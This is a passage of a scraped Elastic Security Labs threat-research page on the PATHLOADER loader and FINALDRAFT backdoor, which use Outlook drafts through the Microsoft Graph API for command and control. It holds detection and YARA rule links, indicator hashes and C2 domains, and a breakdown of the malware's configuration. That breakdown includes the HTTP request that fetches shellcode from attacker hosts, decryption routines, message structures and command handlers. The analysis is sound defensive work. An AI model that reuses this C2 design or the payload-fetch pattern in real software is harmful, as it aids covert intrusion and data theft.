<li><a href="https://attack.mitre.org/techniques/T1057/">Process Discovery</a></li>
<li><a href="https://attack.mitre.org/techniques/T1012/">Query Registry</a></li>
<li><a href="https://attack.mitre.org/techniques/T1567/">Exfiltration Over Web Service</a></li>
</ul>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="mitigations" class="absolute -top-32"></span>Mitigations</h1>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detection-1" class="absolute -top-32"></span>Detection</h2>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_suspicious_memory_write_to_a_remote_process.toml">Suspicious Memory Write to a Remote Process</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/execution_unusual_powershell_engine_imageload.toml">Unusual PowerShell Engine ImageLoad</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_amsi_bypass_via_unbacked_memory.toml">AMSI Bypass via Unbacked Memory</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_amsi_or_wldp_bypass_via_memory_patching.toml">AMSI or WLDP Bypass via Memory Patching</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/privilege_escalation_suspicious_execution_via_windows_services.toml">Suspicious Execution via Windows Service</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_execution_via_windows_command_line_debugging_utility.toml">Execution via Windows Command Line Debugging Utility</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_suspicious_parent_child_relationship.toml">Suspicious Parent-Child Relationship</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="yara" class="absolute -top-32"></span>YARA</h2>
<p>Elastic Security has created the following YARA rules related to this post:</p>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PathLoader.yar">Windows.Trojan.PathLoader</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_FinalDraft.yar">Windows.Trojan.FinalDraft</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Trojan_FinalDraft.yar">Linux.Trojan.FinalDraft</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Trojan_FinalDraft.yar">Multi.Trojan.FinalDraft</a></li>
</ul>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="observations" class="absolute -top-32"></span>Observations</h1>
<p>The following observables were discussed in this research:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Observable</th><th align="left">Type</th><th align="left">Reference</th><th align="left">Date</th></tr></thead><tbody><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf</code></td><td align="left">SHA256</td><td align="left">PATHLOADER</td><td align="left">VT first seen: 2023-05-09 09:44:45 UTC</td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530</code></td><td align="left">SHA256</td><td align="left">FINALDRAFT initial sample</td><td align="left">Telemetry first seen: 2024-11-28 20:49:18.646</td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c</code></td><td align="left">SHA256</td><td align="left">FINALDRAFT ELF variant</td><td align="left">VT first seen: 2024-10-05 07:15:00 UTC</td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code></td><td align="left">domain</td><td align="left">PATHLOADER/FINALDRAFT domain</td><td align="left">Creation date: 2022-08-26T09:43:16Z  Valid until: 2025-08-26T07:00:00Z</td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code></td><td align="left">domain</td><td align="left">PATHLOADER/FINALDRAFT domain</td><td align="left">Creation date: 2023-11-08T09:47:47Z Valid until: 2024-11-08T09:47:47.00Z</td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.vmphere[.]com</code></td><td align="left">domain</td><td align="left">FINALDRAFT domain</td><td align="left">Creation date: 2023-09-12T12:35:57Z Valid until: 2025-09-12T12:35:57Z</td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update.hobiter[.]com</code></td><td align="left">domain</td><td align="left">FINALDRAFT domain</td><td align="left">Creation date: 2023-09-12T12:35:58Z Valid until: 2025-09-12T12:35:58Z</td></tr></tbody></table></div></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/finaldraft#pathloader"><span>PATHLOADER</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/finaldraft#configuration"><span>Configuration</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/finaldraft#api-hashing"><span>API&nbsp;Hashing</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/finaldraft#string-obfuscation"><span>String&nbsp;Obfuscation</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/finaldraft#executionbehavior"><span>Execution/Behavior</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/finaldraft#finaldraft"><span>FINALDRAFT</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/finaldraft#entrypoint"><span>Entrypoint</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/finaldraft#initialization"><span>Initialization</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/finaldraft#configuration-loading-process"><span>Configuration loading&nbsp;process</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/finaldraft#session-id-derivation-process"><span>Session ID derivation&nbsp;process</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts&amp;url=https://www.elastic.co/security-labs/finaldraft" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/finaldraft" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/finaldraft&amp;title=You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/finaldraft&amp;title=You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"You've Got Malware: FINALDRAFT Hides in Your Drafts","slug":"finaldraft","date":"2025-02-13","description":"During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications.","image":"Security Labs Images 13.jpg","tags":[{"slug":"REF7707"},{"slug":"FINALDRAFT"},{"slug":"PATHLOADER"}],"body":{"raw":"\n# Summary\n\nWhile investigating REF7707, Elastic Security Labs discovered a new family of previously unknown malware that leverages Outlook as a communication channel via the Microsoft Graph API. This post-exploitation kit includes a loader, a backdoor, and multiple submodules that enable advanced post-exploitation activities.\n\nOur analysis uncovered a Linux variant and an older PE variant of the malware, each with multiple distinct versions that suggest these tools have been under development for some time. \n\nThe completeness of the tools and the level of engineering involved suggest that the developers are well-organized. The extended time frame of the operation and evidence from our telemetry suggest it’s likely an espionage-oriented campaign. \n\nThis report details the features and capabilities of these tools.\n\n![PATHLOADER \u0026 FINALDRAFT execution diagram](/assets/images/finaldraft/image47.png)\n\nFor the campaign analysis of REF7707 - check out [From South America to Southeast Asia: The Fragile Web of REF7707](https://www.elastic.co/security-labs/fragile-web-ref7707).\n\n# Technical Analysis\n\n## PATHLOADER\n\nPATHLOADER is a Windows PE file that downloads and executes encrypted shellcode retrieved from external infrastructure. \n\nOur team recovered and decrypted the shellcode retrieved by PATHLOADER, extracting a new implant we have not seen publicly reported, which we call FINALDRAFT. We believe these two components are used together to infiltrate sensitive environments.\n\n### Configuration\n\nPATHLOADER is a lightweight Windows executable at 206 kilobytes; this program downloads and executes shellcode hosted on a remote server. PATHLOADER includes an embedded configuration stored in the `.data` section that includes C2 and other relevant settings. \n\n![Embedded configuration](/assets/images/finaldraft/image7.png)\n\nAfter Base64 decoding and converting from the embedded hex string, the original configuration is recovered with two unique typosquatted domains resembling security vendors.\n\n```\nhttps://poster.checkponit.com:443/nzoMeFYgvjyXK3P;https://support.fortineat.com:443/nzoMeFYgvjyXK3P;*|*\n```\n\n*Configuration from PATHLOADER*\n\n### API Hashing\n\nIn order to block static analysis efforts, PATHLOADER performs API hashing using the [Fowler–Noll–Vo hash](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function) function. This can be observed based on the immediate value `0x1000193` found 37 times inside the binary. The API hashing functionality shows up as in-line as opposed to a separate individual function.\n\n![Occurrences of value 0x1000193](/assets/images/finaldraft/image10.png)\n\n### String Obfuscation\n\nPATHLOADER uses string encryption to obfuscate functionality from analysts reviewing the program statically. While the strings are easy to decrypt while running or if using a debugger, the obfuscation shows up in line, increasing the complexity and making it more challenging to follow the control flow. This obfuscation uses SIMD (Single Instruction, Multiple Data) instructions and XMM registers to transform the data.\n\n![String obfuscation example](/assets/images/finaldraft/image56.png)\n\nOne string related to logging `WinHttpSendRequest` error codes used by the malware developer was left unencrypted.\n\n![Logging string left unencrypted](/assets/images/finaldraft/image55.png)\n\n### Execution/Behavior\n\nUpon execution, PATHLOADER employs a combination of  `GetTickCount64` and `Sleep` methods to avoid immediate execution in a sandbox environment. After a few minutes, PATHLOADER parses its embedded configuration, cycling through both preconfigured C2 domains (`poster.checkponit[.]com`, `support.fortineat[.]com`) attempting to download the shellcode through `HTTPS` `GET` requests.\n\n```\nGET http://poster.checkponit.com/nzoMeFYgvjyXK3P HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nHost: poster.checkponit.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36\n```\n\nThe shellcode is AES encrypted and Base64 encoded. The AES decryption is performed using the shellcode download URL path `“/nzoMeFYgvjyXK3P”` as the 128-bit key used in the call to the `CryptImportKey` API.\n\n![CryptImportKey parameters](/assets/images/finaldraft/image53.png)\n\nAfter the `CryptDecrypt` call, the decrypted shellcode is copied into previously allocated memory. The memory page is then set to `PAGE_EXECUTE_READ_WRITE` using the `NtProtectVirtualMemory` API. Once the page is set to the appropriate protection, the shellcode entrypoint is called, which in turn loads and executes the next stage: FINALDRAFT.\n\n## FINALDRAFT\n\nFINALDRAFT is a 64-bit malware written in C++ that focuses on data exfiltration and process injection. It includes additional modules, identified as parts of the FINALDRAFT kit, which can be injected by the malware. The output from these modules is then forwarded to the C2 server.\n\n### Entrypoint\n\nFINALDRAFT exports a single entry point as its entry function. The name of this function varies between samples; in this sample, it is called `UpdateTask`.\n\n![PE export of FINALDRAFT](/assets/images/finaldraft/image51.png)\n\n### Initialization\n\nThe malware is initialized by loading its configuration and generating a session ID. \n\n#### Configuration loading process\n\nThe configuration is hardcoded in the binary in an encrypted blob. It is decrypted using the following algorithm.\n\n```c\nfor ( i = 0; i \u003c 0x149A; ++i )\n  configuration[i] ^= decryption_key[i \u0026 7];\n```\n\n*Decryption algorithm for configuration data*\n\nThe decryption key is derived either from the Windows product ID (`HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductId`) or from a string located after the encrypted blob. This is determined by a global flag located after the encrypted configuration blob.\n\n![Decryption key and flag found after the encrypted config blob](/assets/images/finaldraft/image8.png)\n\n![Choice between the decryption key or Windows product ID for derivation](/assets/images/finaldraft/image41.png)\n\nThe decryption key derivation algorithm is performed as follows:\n\n```c\nuint64_t decryption_key = 0;\ndo\n  decryption_key = *data_source++ + 31 * decryption_key;\nwhile ( data_source != \u0026data_source[data_source_length] );\n```\n\n*Decryption key derivation algorithm*\n\nThe configuration structure is described as follows:\n\n```c\nstruct Configuration // sizeof=0x149a\n{\n  char c2_hosts_or_refresh_token[5000];\n  char pastebin_url[200];\n  char guid[36];\n  uint8_t unknown_0[4];\n  uint16_t build_id;\n  uint32_t sleep_value;\n  uint8_t communication_method;\n  uint8_t aes_encryption_key[16];\n  bool get_external_ip_address;\n  uint8_t unknown_1[10]\n};\n```\n\n*Configuration structure*\n\nThe configuration is consistent across variants and versions, although not all fields are utilized. For example, the communication method field wasn't used in the main variant at the time of this publication, and only the MSGraph/Outlook method was used. However, this is not the case in the ELF variant or prior versions of FINALDRAFT.\n\nThe configuration also contains a Pastebin URL, which isn’t used across any of the variants. However, this URL was quite useful to us for pivoting from the initial sample.\n\n#### Session ID derivation process\n\nThe session ID used for communication between FINALDRAFT and C2 is generated by creating a random GUID, which is then processed using the [Fowler-Noll-Vo](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function) (FNV) hash function.\n\n![FINALDRAFT client ID generation](/assets/images/finaldraft/image43.png)\n\n### Communication protocol\n\nDuring our analysis, we discovered that different communication methods are available from the configuration; however, the most contemporary sample at this time uses only the `COutlookTrans` class, which abuses the Outlook mail service via the Microsoft Graph API. This same technique was observed in [SIESTAGRAPH](https://www.elastic.co/security-labs/update-to-the-REF2924-intrusion-set-and-related-campaigns), a previously unknown malware family reported by Elastic Security Labs in February 2023 and attributed to a PRC-affiliated threat group.\n\nThe Microsoft Graph API token is obtained by FINALDRAFT using the [https://login.microsoftonline.com/common/oauth2/token](https://login.microsoftonline.com/common/oauth2/token) endpoint. The refresh token used for this endpoint is located in the configuration.\n\n![Building refresh token request](/assets/images/finaldraft/image36.png)\n\n![Token refresh POST request](/assets/images/finaldraft/image40.png)\n\nOnce refreshed, the Microsoft Graph API token is stored in the following registry paths based on whether the user has administrator privileges: \n\n- `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID\\\u003cuuid_from_configuration\u003e`  \n- `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID\\\u003cuuid_from_configuration\u003e`\n\nThis token is reused across requests, if it is still valid.\n\n![Storing refresh token in the registry](/assets/images/finaldraft/image3.png)\n\nThe communication loop is described as follows:\n\n- Create a session email draft if it doesn’t already exist.  \n- Read and delete command request email drafts created by the C2.  \n- Process commands  \n- Write command response emails as drafts for each processed command.\n\nA check is performed to determine whether a session email, in the form of a command response email identified by the subject `p_\u003csession-id\u003e`, already exists. If it does not, one is created in the mail drafts. The content of this email is base64 encoded but not AES encrypted.\n\n![Check for session email and create one if it doesn't exist](/assets/images/finaldraft/image19.png)\n\n![Session email: GET and POST requests](/assets/images/finaldraft/image46.png)\n\nThe session data is described in the structure below.\n\n```c\nstruct Session\n{\n  char random_bytes[30];\n  uint32_t total_size;\n  char field_22;\n  uint64_t session_id;\n  uint64_t build_number;\n  char field_33;\n};\n```\n\n*Session data structure*\n\nThe command queue is filled by checking the last five C2 command request emails in the mail drafts, which have subjects `r_\u003csession-id\u003e`.\n\n![Checking for commands email](/assets/images/finaldraft/image39.png)\n\n![Command polling GET request](/assets/images/finaldraft/image49.png)\n\nAfter reading the request, emails are then deleted.\n\n![Deleting command email after reading](/assets/images/finaldraft/image15.png)\n\nCommands are then processed, and responses are written into new draft emails, each with the same `p_\u003csession-id\u003e` subject for each command response.\n\n![Command response POST request](/assets/images/finaldraft/image13.png)\n\nContent for message requests and responses are **Zlib** compressed, **AES CBC** encrypted, and Base64 encoded. The AES key used for encryption and decryption is located in the configuration blob. \n\n```Base64(AESEncrypt(ZlibCompress(data)))```\n\nRequest messages sent from the C2 to the implant follow this structure.\n\n```c\nstruct C2Message{\n  struct {\n    uint8_t random_bytes[0x1E];  \n    uint32_t message_size;    \n    uint64_t session_id;      \n  } header;                     // Size: 0x2A (42 bytes)\n  \n  struct {\n    uint32_t command_size;                     \n    uint32_t next_command_struct_offset;\n    uint8_t command_id;                   \n    uint8_t unknown[8];                   \n    uint8_t command_args[];                       \n  } commands[];\n};\n```\n\n*Request message structure*\n\nResponse messages sent from the implant to C2 follow this structure.\n\n```c\nstruct ImplantMessage {\n  struct Header {\n    uint8_t random_bytes[0x1E];  \n    uint32_t total_size;    \n    uint8_t flag;\t\t// Set to 1\n    uint64_t session_id;\n    uint16_t build_id;\n    uint8_t pad[6];\n  } header;\n  \n  struct Message {\n    uint32_t actual_data_size_add_0xf;\n    uint8_t command_id;\n    uint8_t unknown[8];\n    uint8_t flag_success;\n    char newline[0x2];\n    uint8_t actual_data[];\n  }                    \n};\n```\n\n*Response message structure*\n\nHere is an example of data stolen by the implant.\n\n![Response message example](/assets/images/finaldraft/image52.png)\n\n### Commands\n\nFinalDraft registers 37 command handlers, with most capabilities revolving around process injection, file manipulation, and network proxy capabilities.\n\n![FINALDRAFT command handler setup](/assets/images/finaldraft/image23.png)\n\nBelow is a table of the commands and their IDs:\n\n| ID   | Name                                         |\n| :--- | :------------------------------------------- |\n| 0    | GatherComputerInformation                    |\n| 2    | StartTcpServerProxyToC2                      |\n| 3    | StopTcpServerProxyToC2                       |\n| 4    | ConnectToTcpTargetStartProxyToC2             |\n| 5    | SetSleepValue                                |\n| 6    | DeleteNetworkProjectorFwRuleAndStopTCPServer |\n| 8    | ConnectToTcpTarget                           |\n| 9    | SendDataToUdpOrTcpTarget                     |\n| 10   | CloseTcpConnection                           |\n| 11   | DoProcessInjectionSendOutputEx               |\n| 12   | ListFiles                                    |\n| 13   | ListAvailableDrives                          |\n| 14   | CreateDirectory                              |\n| 15   | DeleteFileOrDirectory                        |\n| 16   | DownloadFile                                 |\n| 17   | UploadFile0                                  |\n| 18   | DummyFunction                                |\n| 19   | SetCurrentDirectory                          |\n| 20   | GetCurrentDirectory                          |\n| 21   | ListRunningProcesses                         |\n| 24   | DoProcessInjectionNoOutput                   |\n| 25   | DoProcessInjectionNoOutput (Same as 24\\)     |\n| 26   | DoProcessInjectionSendOutput1                |\n| 28   | DisconnectFromNamedPipe                      |\n| 30   | ConnectToNamedPipeAndProxyMessageToC2        |\n| 31   | GetCurrentProcessTokenInformation            |\n| 32   | EnumerateActiveSessions                      |\n| 33   | ListActiveTcpUdpConnections                  |\n| 35   | MoveFile1                                    |\n| 36   | GetOrSetFileTime                             |\n| 39   | UploadFile1                                  |\n| 41   | MoveFile0                                    |\n| 42   | CopyFileOrCopyDirectory                      |\n| 43   | TerminateProcess                             |\n| 44   | CreateProcess                                |\n\n*FINALDRAFT command handler table*\n\n### Gather computer 